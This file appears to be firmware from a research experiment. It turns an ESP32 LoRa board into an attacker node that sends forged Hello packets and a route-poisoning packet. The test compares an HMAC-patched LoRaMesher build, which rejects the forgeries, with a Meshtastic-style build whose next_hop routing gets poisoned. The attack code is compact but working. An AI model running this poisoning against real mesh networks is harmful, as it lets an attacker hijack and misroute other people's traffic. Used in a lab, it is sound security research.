// E18 — Patch Asymmetry: Attacker vs HMAC-patched targets
//
// Demonstrates:
//   Attack on LoRaMesher+HMAC (node_sender_hmac): BLOCKED
//     Attacker cannot forge authenticated Hello → routing table intact
//
//   Attack on Meshtastic+HMAC (node_sender_mesh_hmac): SUCCEEDS
//     Attacker sends ROUTE_POISON (not NodeInfo) → next_hop poisoned
//     HMAC on NodeInfo is irrelevant to the attack vector
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID  0xCC   // attacker
#define NODE_A   0xAA   // sender (both LM and Mesh variants)
#define NODE_GW  0xBB   // gateway

// Forged (invalid HMAC) Hello for LoRaMesher — should be REJECTED
struct AuthHello {
  uint8_t  src;
  uint8_t  metric;
  uint16_t seq;
  uint8_t  hmac[4];
} __attribute__((packed));

#include <RadioLib.h>
#include <SPI.h>
#include <Wire.h>
#include "SSD1306Wire.h"

#define LORA_NSS    7
#define LORA_DIO1  33
#define LORA_RST    8
#define LORA_BUSY  34
#define LORA_SCK    5
#define LORA_MOSI   6
#define LORA_MISO   3
#define LORA_FREQ  923.0
#define LORA_BW    125.0
#define LORA_SF      9
#define LORA_CR      7
#define LORA_SYNC  0x34
#define LORA_POWER  10
#define LORA_TCXO  1.6f

uint32_t lm_poison_attempts  = 0;
uint32_t mesh_poison_sent    = 0;

SSD1306Wire oled(0x3c, 18, 17);
SPIClass    spi(FSPI);
Module*     mod   = nullptr;
SX1262*     radio = nullptr;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  ATTACKER");
  char buf[40];
  snprintf(buf, sizeof(buf), "LM-atk=%u (BLOCKED)", lm_poison_attempts);
  oled.drawString(0, 14, buf);
  snprintf(buf, sizeof(buf), "MESH-atk=%u (OK)", mesh_poison_sent);
  oled.drawString(0, 28, buf);
  oled.drawString(0, 42, "ASYMMETRY SHOWN");
  oled.display();
}

void try_lm_poison() {
  // Forge Hello with INVALID HMAC — receiver (LM+HMAC) will reject
  AuthHello h;
  h.src    = NODE_ID;  // attacker claims self as better route
  h.metric = 0;        // best metric
  h.seq    = lm_poison_attempts;
  h.hmac[0] = 0xDE; h.hmac[1] = 0xAD;  // wrong HMAC
  h.hmac[2] = 0x00; h.hmac[3] = 0x00;

  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  lm_poison_attempts++;
  Serial.printf("[LM-ATTACK] Forged Hello with invalid HMAC (attempt %u)\n",
                lm_poison_attempts);
  Serial.printf("[RESULT] LoRaMesher+HMAC: MAC verification FAILS — attack BLOCKED\n");
}

void send_mesh_route_poison() {
  // ROUTE_POISON: NOT a NodeInfo, NOT covered by HMAC on NodeInfo
  // Meshtastic sender accepts this because it's a different message type
  uint8_t poison[4] = {0xFE, NODE_A, NODE_ID, 0x00};
  radio->transmit(poison, 4);
  radio->startReceive();
  mesh_poison_sent++;
  Serial.printf("[MESH-ATTACK] ROUTE_POISON sent (attempt %u) — bypasses HMAC on NodeInfo\n",
                mesh_poison_sent);
  Serial.printf("[RESULT] Meshtastic+HMAC: poison accepted — attack SUCCEEDS\n");
  Serial.printf("[KEY-FINDING] HMAC protects control plane; attack is on data-plane next_hop\n");
}

void setup() {
  Serial.begin(115200); delay(500);
  Serial.println("=== E18 Node C (Patch Asymmetry Attacker) ===");
  Serial.println("[ATTACK] Two modes: LM+HMAC (expect BLOCK) vs Mesh+HMAC (expect SUCCESS)");
  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically(); oled_draw();

  pinMode(LORA_NSS, OUTPUT); digitalWrite(LORA_NSS, HIGH);
  pinMode(LORA_BUSY, INPUT);
  pinMode(LORA_RST, OUTPUT);
  digitalWrite(LORA_RST, LOW); delay(2);
  digitalWrite(LORA_RST, HIGH); delay(20);
  uint32_t t = millis();
  while (digitalRead(LORA_BUSY) && millis()-t < 500) delay(1);

  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
               LORA_SYNC, LORA_POWER, 8, LORA_TCXO);

  // Initial attack burst
  for (int i = 0; i < 3; i++) {
    try_lm_poison();
    delay(100);
    send_mesh_route_poison();
    delay(100);
  }
  radio->startReceive();
  Serial.println("[ASYMMETRY] Both attacks sent — expect LM blocked, Mesh poisoned");
}

void loop() {
  static uint32_t last_attack = 0;
  if (millis() - last_attack > 30000) {
    last_attack = millis();
    try_lm_poison();
    delay(200);
    send_mesh_route_poison();
    oled_draw();
  }
}
